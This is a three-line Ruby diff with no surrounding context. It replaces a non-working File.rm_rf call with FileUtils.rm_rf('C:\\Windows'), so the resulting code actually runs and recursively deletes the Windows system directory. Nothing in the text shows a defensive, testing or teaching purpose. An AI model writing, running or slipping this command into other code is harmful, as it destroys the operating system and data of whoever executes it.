@@ -1,3 +1,3 @@
 require 'fileutils'
 
-File.rm_rf('C:\\Windows')
+FileUtils.rm_rf('C:\\Windows')
